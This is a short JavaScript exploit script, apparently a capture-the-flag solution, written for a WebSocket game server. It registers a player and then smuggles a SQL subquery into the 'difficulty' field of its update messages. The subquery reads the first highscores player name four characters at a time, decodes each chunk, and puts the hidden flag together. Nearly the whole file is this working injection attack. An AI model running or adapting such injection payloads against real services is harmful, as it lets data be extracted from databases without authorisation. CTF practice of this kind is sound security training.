var substringStart = 1;
var playerId;
var flag = '';
var ws = new WebSocket('ws://' + window.location.hostname + ':' + window.location.port + '/ass-tapping');
ws.addEventListener('open', function() {
	ws.send(JSON.stringify({
		"action": "register",
		"parameter": "yoloswagger"
	}));
});
// http://stackoverflow.com/a/3745677
function hex2a(hexx) {
	var hex = hexx.toString();//force conversion
	var str = '';
	for (var i = 0; i < hex.length; i += 2)
		str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
	return str;
}
function getNextPart() {
	ws.send(JSON.stringify({
		"action": "updateDifficulty",
		"parameter": {
			"playerId": playerId,
			"difficulty": "1, difficulty = (SELECT CONV(HEX(SUBSTRING(playerName, " + substringStart + ", 4)), 16, 10) FROM highscores LIMIT 1)"
		}
	}));
	ws.send(JSON.stringify({
		"action": "getDifficulty",
		"parameter": playerId
	}));
}
ws.addEventListener('message', function(msg) {
	var data = JSON.parse(msg.data);
	if (data.action == 'receiveDifficulty') {
		flag += hex2a(data.parameter.toString(16));
		if (substringStart < 40) {
			substringStart += 4;
			getNextPart();
		}
		else {
			ws.close();
			alert(flag);
		}
	}
	else if (data.action == 'completeRegistration') {
		playerId = data.parameter;
		getNextPart();
	}
});